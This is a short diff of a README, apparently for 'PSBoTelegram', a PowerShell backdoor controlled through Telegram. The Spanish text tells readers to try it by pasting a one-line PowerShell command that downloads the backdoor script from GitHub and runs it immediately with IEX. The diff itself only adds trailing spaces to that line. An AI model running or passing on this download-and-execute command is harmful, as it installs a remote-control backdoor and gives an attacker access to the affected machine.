@@ -2,7 +2,7 @@
 Backdoor using Telegram and Powershell  
 
 Podeis probar el script abriendo una consola de powershell y pegando esto:
-&nbsp;**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1").content**
+&nbsp;**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1").content**&nbsp;&nbsp;
 
         ____  _____ ____      ______     __
        / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
